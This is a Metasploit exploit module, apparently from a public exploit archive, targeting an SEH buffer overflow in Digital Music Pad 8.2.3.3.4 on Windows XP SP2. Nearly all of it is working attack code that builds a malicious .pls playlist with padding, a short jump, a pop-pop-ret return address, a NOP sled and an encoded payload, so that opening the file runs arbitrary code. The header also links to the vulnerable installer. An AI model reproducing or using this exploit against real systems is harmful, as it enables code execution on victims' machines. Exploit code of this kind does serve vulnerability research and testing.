#Digital Music Pad Version 8.2.3.3.4 SEH overflow Metasploit Module
#Author Abhishek Lyall - abhilyall[at]gmail[dot]com, info[at]aslitsecurity[dot]com
#Web - http://www.aslitsecurity.com/
#Blog - http://www.aslitsecurity.blogspot.com/
#Download Vulnerable application from http://www.e-soft.co.uk/DigitalMusicPad82334Setup.exe
#Vulnerable versionDigital Music Pad Version 8.2.3.3.4
#Tested on XP SP2
#Greets Corelan Team, Puneet Jain ASL IT SECURITY TEAM
#!/usr/bin/python
 


require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::FILEFORMAT
    include Msf::Exploit::Remote::Seh
 
    def initialize(info = {})
        super(update_info(info,
            'Name' => 'Digital Music Pad Version 8.2.3.3.4 SEH overflow',
			'Description'    => %q{
					This module exploits a buffer overflow in Digital Music Pad Version 8.2.3.3.4 
				When opening a malicious pls file with the Digital Music Pad,
				a remote attacker could overflow a buffer and execute
				arbitrary code.
			},

            'License' => MSF_LICENSE,
            'Author' => 'Abhishek Lyall',
            'References' =>
                [
                    [ 'OSVDB', '' ],
                    
                ],
            'DefaultOptions' =>
                {
                    'EXITFUNC' => 'process',
                },
            'Payload' =>
                {
                    'Space' => 4720,
                    'BadChars' => "\x00\x20\x0a\x0d",
                    'DisableNops' => 'True',
                },
            'Platform' => 'win',
            'Targets' =>
                [
                    [ 'Windows XP SP2', { 'Ret' => 0x73421DEF} ], # p/p/r msvbvm60.dll
 
                ],
            'Privileged' => false,
            'DefaultTarget' => 0))
 
        register_options(
            [
                OptString.new('FILENAME', [ false, 'The file name.', 'msf.pls']),
            ], self.class)
    end
 
 
    def exploit
 
    
	    sploit = "\x5B\x70\x6C\x61\x79\x6C\x69\x73\x74\x5D\x0D\x0A\x46\x69\x6C\x65\x31\x3D" #PLS Header
        sploit << rand_text_alphanumeric(260)
        sploit << "\xeb\x06\x90\x90"            # short jump 6 bytes
        sploit << [target.ret].pack('V')
        sploit << "\x90" * 12                   # nop sled
        sploit << payload.encoded
		sploit << "\x90" * (4720 - payload.encoded.length)
 
        print_status("Creating '#{datastore['FILENAME']}' file ...")
        file_create(sploit)
 
    end
 
end